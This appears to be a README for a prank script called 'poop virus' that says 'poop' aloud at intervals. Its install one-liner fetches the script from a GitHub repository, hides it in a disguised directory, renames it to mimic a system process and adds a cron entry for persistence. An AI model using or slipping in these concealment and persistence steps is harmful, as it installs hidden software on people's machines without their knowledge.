# poop virus

_With great power comes great responsibility._

## Features
- Says “poop” out loud every ~30 minutes.
- Runs silently in the background via `cron` using a stealthy directory (`~/.sysupdate`)
- `poop-virus.sh` is renamed to sysd to blend in with system processes.

---

## 🛠️ Installation (1-liner)

```bash
git clone https://github.com/nwoonet/misc.git && mkdir -p ~/.sysupdate && mv misc/poop-virus.sh ~/.sysupdate/sysd && chmod +x ~/.sysupdate/sysd && rm -rf misc && (crontab -l 2>/dev/null; echo "*/5 * * * * ~/.sysupdate/sysd") | crontab -
```

## Uninstall (1-liner)
```bash
crontab -l | grep -v sysupdate | crontab - && rm -rf ~/.sysupdate
```
